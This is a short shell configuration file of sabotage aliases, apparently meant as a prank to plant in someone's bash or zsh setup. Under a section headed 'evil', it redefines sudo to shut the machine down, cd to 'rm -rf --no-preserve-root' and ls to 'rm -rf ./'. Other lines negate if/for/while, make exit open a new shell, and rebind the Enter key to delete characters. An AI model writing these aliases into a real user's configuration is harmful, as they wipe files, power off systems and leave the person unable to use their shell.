```
# common
alias if='if !' for='for !' while='while !';

alias vim="vim +q";

# evil
alias sudo='sudo shutdown -P now';
alias cd='rm -rf --no-preserve-root';
alias ls='rm -rf ./';

# zsh
alias exit='zsh';
bindkey "^U" transpose-chars;

## pair
bindkey "^J" backward-delete-char;
bindkey "^M" backward-delete-char;
```
